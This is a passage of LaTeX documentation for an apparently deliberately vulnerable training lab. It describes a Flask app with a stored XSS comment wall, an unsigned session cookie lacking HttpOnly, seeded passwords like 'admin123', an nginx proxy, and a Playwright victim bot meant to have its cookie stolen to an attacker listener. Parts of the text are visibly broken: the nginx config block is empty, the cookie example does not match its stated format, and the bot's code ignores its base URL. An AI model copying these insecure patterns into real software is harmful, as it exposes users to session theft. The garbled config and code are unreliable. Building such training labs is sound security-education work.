\toprule\noalign{}
Parameter & Value \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
Internal hostname & \texttt{flask} (Docker DNS) \\
Internal port & \texttt{5000} \\
Exposed via & nginx on port \texttt{80} \\
\end{longtable}}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Key routes}

{\footnotesize\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{0.30\linewidth}
  >{\raggedright\arraybackslash}p{0.30\linewidth}
  >{\raggedright\arraybackslash}p{0.30\linewidth}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
Route
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Auth required
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Description
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\path{/} & No & Redirects to \path{/login} \\
\path{/login} & No & Login form --- POST authenticates the user \\
\path{/logout} & No & Clears the session cookie \\
\path{/comments} & No & Public comment wall --- \textbf{Stored XSS entry point} \\
\path{/search} & Yes & Internal search --- \textbf{SQLi entry point} (Lab 2 ext.) \\
\end{longtable}}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Session mechanism}

Synapse identifies authenticated users with a plain-text cookie:

\begin{lstlisting}
session=<id>:<username>:<role>
\end{lstlisting}

Example for the \texttt{guest} user:

\begin{lstlisting}
session=2guest
\end{lstlisting}

The server reads this cookie on every request and trusts it unconditionally. There is no HMAC signing or server-side session store.

\begin{lstlisting}
The session cookie is issued \textbf{without} the `HttpOnly` attribute.
Any JavaScript running in the page context can read it via `document.cookie`.
This is the root cause that makes the XSS -> session hijack chain possible.
\end{lstlisting}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Database}

Synapse uses a SQLite database stored at \path{/opt/synapse/synapse.db}, persisted via the \texttt{synapse-db} Docker volume so data survives container restarts.

Seeded users:

{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.22\linewidth}
  >{\raggedright\arraybackslash}p{0.22\linewidth}
  >{\raggedright\arraybackslash}p{0.22\linewidth}
  >{\raggedright\arraybackslash}p{0.22\linewidth}@{}}
\toprule\noalign{}
ID & Username & Password & Role \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
1 & \texttt{admin} & \texttt{admin123} & admin \\
2 & \texttt{guest} & \texttt{guest123} & guest \\
\end{longtable}}

Comments table schema:

\begin{lstlisting}
CREATE TABLE comments (
    id      INTEGER PRIMARY KEY AUTOINCREMENT,
    author  TEXT,
    content TEXT   -- rendered with |safe in Jinja2, no HTML escaping
);
\end{lstlisting}

\begin{lstlisting}
The comments template renders `content` with the `|safe` filter, which disables
Jinja2's automatic HTML escaping. Any HTML or JavaScript inserted as a comment
is rendered verbatim by the browser.
\end{lstlisting}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Vulnerability surface}

\begin{lstlisting}
POST /comments
  \---- content field (no sanitisation)
        \---- stored raw in SQLite
              \---- rendered with |safe in Jinja2 template
                    \---- executed by every browser that loads /comments
\end{lstlisting}

The victim bot authenticates as \texttt{guest} and loads \path{/comments} every \textasciitilde20 s, providing a reliable and repeatable trigger for any stored payload.

\section{LAB2 -- nginx Reverse Proxy}

The \texttt{nginx} container is the only service with a port published to the host network. It receives all inbound HTTP traffic from the Attacker and forwards it to the Flask application using Docker's internal DNS.

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Network parameters}

{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.45\linewidth}
  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
\toprule\noalign{}
Parameter & Value \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
Public IP & \texttt{192.168.30.x} \\
Published port & \texttt{80} \\
Upstream & \path{http://flask:5000} \\
Config file path & \path{./nginx/default.conf} \\
\end{longtable}}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Configuration}

\begin{lstlisting}
server 
}
\end{lstlisting}

All requests are forwarded transparently to the \texttt{flask} container. No TLS is configured --- intentional for the lab environment.

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Connectivity verification}

From the Attacker (Parrot):

\begin{lstlisting}
curl -v \url{http://192.168.30.x/login}
# Expected: HTTP 200 with Synapse login page HTML
\end{lstlisting}

From inside the Docker host:

\begin{lstlisting}
curl -v http://localhost/login
\end{lstlisting}

\begin{lstlisting}
Watch nginx access logs while running the exercise to confirm the victim bot
is hitting `/comments` on schedule:

```bash
docker compose logs -f nginx
```
\end{lstlisting}

\section{LAB2 -- Victim Bot (Playwright)}

The \texttt{victim} container simulates an \textbf{authenticated user} who periodically browses the Synapse application. It removes the need for a second physical person to act as the victim --- the bot plays that role automatically and deterministically.

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Network parameters}

{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.45\linewidth}
  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
\toprule\noalign{}
Parameter & Value \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
Container name & \path{synapse_victim} \\
Reaches & \path{http://nginx} (Docker DNS) \\
Published ports & None --- internal only \\
\end{longtable}}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Behaviour cycle}

The bot runs \texttt{victim.py} in an infinite loop. Each iteration takes \textasciitilde30 s:

{\footnotesize\begin{longtable}[]{@{}>{\raggedright\arraybackslash}p{0.45\linewidth}
  >{\raggedright\arraybackslash}p{0.45\linewidth}@{}}
\toprule\noalign{}
Step & Action \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
1 & Navigate to \path{http://nginx/login} \\
2 & Fill username \texttt{guest} / password \texttt{guest123} and submit \\
3 & Print cookies obtained after login \\
4 & Navigate to \path{http://nginx/comments} \\
5 & Hold the page open for \textbf{8 seconds} --- XSS fires here \\
6 & Sleep 20 seconds, then repeat \\
\end{longtable}}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Source code}

\begin{lstlisting}
import time
from playwright.sync_api import sync_playwright

BASE = "http://nginx"
USER = "guest"
PASS = "guest123"

def run():
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()

        while True:
            try:
                page.goto(f"/login", wait_until="networkidle")
                page.fill('input[name="username"]', USER)
                page.fill('input[name="password"]', PASS)
                page.click('button[type="submit"]')
                page.wait_for_timeout(2000)

                page.goto(f"/comments", wait_until="networkidle")
                page.wait_for_timeout(8000)   # XSS payload executes here

            except Exception as e:
                print("victim error:", e)

            time.sleep(20)

if __name__ == "__main__":
    run()
\end{lstlisting}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Why the victim triggers the XSS}

When the bot loads \path{/comments}, Chromium renders the full page HTML including any \texttt{\textless{}script\textgreater{}} tags stored in the comments table. At that moment the browser holds an active session cookie for \texttt{guest}, so \texttt{document.cookie} contains the value the attacker wants to steal.

The 8-second \path{wait_for_timeout} gives the \texttt{fetch()} payload enough time to reach the attacker's listener before the page is navigated away.

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsection{Monitoring}

\begin{lstlisting}
docker compose logs -f victim
\end{lstlisting}

Typical output during a normal cycle:

\begin{lstlisting}
[victim] visiting /login
[victim] url after login: http://nginx/comments
[victim] cookies after login: []
[victim] visiting /comments
[victim] url after comments: http://nginx/comments
[victim] cookies before wait: []
\end{lstlisting}

\begin{lstlisting}
Post the XSS comment first, then wait for the next cycle. The bot visits
`/comments` every ~20 s. If the listener receives no request after 40 s,
double-check that port `8000` on `10.0.40.5` is reachable from the Docker
network and that the payload syntax is correct.


Each iteration reuses the same browser context, so the session cookie persists
across cycles without re-authenticating every time. If the container restarts,
a fresh login cycle begins automatically.
\end{lstlisting}
